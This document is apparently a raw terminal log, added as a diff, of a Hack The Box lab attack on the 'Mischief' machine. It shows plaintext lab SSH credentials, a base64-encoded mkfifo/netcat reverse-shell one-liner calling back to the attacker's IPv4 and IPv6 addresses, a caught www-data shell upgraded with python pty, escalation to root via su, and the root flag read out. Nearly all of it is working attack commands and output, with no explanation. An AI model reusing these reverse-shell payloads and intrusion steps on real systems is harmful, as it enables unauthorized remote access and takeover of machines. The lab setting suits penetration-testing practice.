@@ -1,0 +1,90 @@
+root@parrot:~/hackthebox/mischief# cat ssh_cred                                 
+username: loki                          
+password : lokiisthebestnorsegod        
+root@parrot:~/hackthebox/mischief# ssh loki@10.10.10.92                         
+^C                                      
+root@parrot:~/hackthebox/mischief# echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f | base64 -w 0                             
+rm /tmp/f                               
+Ncat: Connection refused.               
+root@parrot:~/hackthebox/mischief#  echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f' | base64 -w 0                          
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTQgOTAwMSA+L3RtcC9mCg==root@parrot:~/hackthebox/mischief# nc -nvlp 9001     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+^C                                      
+root@parrot:~/hackthebox/mischief# ifconfig tun0                                
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500              
+        inet 10.10.14.14  netmask 255.255.254.0  destination 10.10.14.14        
+        inet6 fe80::b2fa:65d:5b1b:4607  prefixlen 64  scopeid 0x20<link>        
+        inet6 dead:beef:2::100c  prefixlen 64  scopeid 0x0<global>              
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)                                                                         
+        RX packets 7404  bytes 4965849 (4.7 MiB)                                
+        RX errors 0  dropped 0  overruns 0  frame 0                             
+        TX packets 17745  bytes 1166756 (1.1 MiB)                               
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0              
+
+root@parrot:~/hackthebox/mischief# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/n? dead:beef:2::100c 9001 >/tmp/f' | base64 -w 0                
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uPyBkZWFkOmJlZWY6Mjo6MTAwYyA5MDAxID4vdG1wL2YKroot@parrot:~/hackthebox/mischief# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/n? -6 dead:beef:2::100c 9001 >/tmp/f' | base64 -w 0                                                      
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uPyAtNiBkZWFkOmJlZWY6Mjo6MTAwYyA5MDAxID4vdG1wL2YKroot@parrot:~/hackthebox/mischief# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tm^C                                                                                                                            
+root@parrot:~/hackthebox/mischief# ^C   
+root@parrot:~/hackthebox/mischief# echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/n? -6 dead:beef:2::100c 9001 >/tmp/f' | base64 -w 0          
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uPyAtNiBkZWFkOmJlZWY6Mjo6MTAwYyA5MDAxID4vdG1wL2Y=root@parrot:~/hackthebox/mischief#   
+root@parrot:~/hackthebox/mischief#      
+root@parrot:~/hackthebox/mischief# nc -nvlp 9001                                
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from dead:beef::250:56ff:feb9:18b6.                            
+Ncat: Connection from dead:beef::250:56ff:feb9:18b6:42836.                      
+/bin/sh: 0: can't access tty; job control turned off                            
+$ ls                                    
+assets                                  
+database.php                            
+index.php                               
+login.php                               
+logout.php                              
+$ whoami                                
+www-data                                
+$ python -c "import pty ;pty.spawn('/bin/bash')"                                
+www-data@Mischief:/var/www/html$ ^Z     
+[1]+  Stopped                 nc -nvlp 9001                                     
+root@parrot:~/hackthebox/mischief# stty raw -echo                               
+root@parrot:~/hackthebox/mischief# nc -nvlp 9001                                
+
+www-data@Mischief:/var/www/html$ cd /home/loki                                  
+www-data@Mischief:/home/loki$ ls -la    
+total 60                                
+drwxr-xr-x 6 loki loki 4096 Jul 14  2018 .                                      
+drwxr-xr-x 3 root root 4096 May 14  2018 ..                                     
+-rw------- 1 loki loki  192 Jul 14  2018 .bash_history                          
+-rw-r--r-- 1 loki loki  220 Apr  4  2018 .bash_logout                           
+-rw-r--r-- 1 loki loki 3771 Apr  4  2018 .bashrc                                
+drwx------ 2 loki loki 4096 May 14  2018 .cache                                 
+drwx------ 3 loki loki 4096 May 14  2018 .gnupg                                 
+drwxrwxr-x 4 loki loki 4096 May 14  2018 .local                                 
+-rw------- 1 loki loki  125 May 14  2018 .mysql_history                         
+-rw-r--r-- 1 loki loki  807 Apr  4  2018 .profile                               
+-rw-rw-r-- 1 loki loki   66 May 14  2018 .selected_editor                       
+-rw-r--r-- 1 loki loki    0 May 14  2018 .sudo_as_admin_successful              
+-rw-rw-r-- 1 loki loki  176 May 14  2018 .wget-hsts                             
+-rw-rw-r-- 1 loki loki   28 May 17  2018 credentials                            
+drwxrwxr-x 2 loki loki 4096 May 15  2018 hosted                                 
+-r-------- 1 loki loki   33 May 17  2018 user.txt                               
+www-data@Mischief:/home/loki$ ls        
+credentials  hosted  user.txt           
+www-data@Mischief:/home/loki$ su -      
+Password:                               
+root@Mischief:~# ls                     
+root.txt                                
+root@Mischief:~#                        
+root@Mischief:~#                        
+root@Mischief:~#                        
+root@Mischief:~#                        
+root@Mischief:~#                        
+root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnuu/7/root.txt                  
+cat: /usr/lib/gcc/x86_64-linux-gnuu/7/root.txt: No such file or directory       
+root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt                   
+ae155fad479c56f912c65d7be4487807        
+root@Mischief:~# ls -la /usr/lib/gcc/x86_64-linux-gnu/7/root.txt                
+-r-------- 1 root root 33 May 17  2018 /usr/lib/gcc/x86_64-linux-gnu/7/root.txt 
+root@Mischief:~#                        
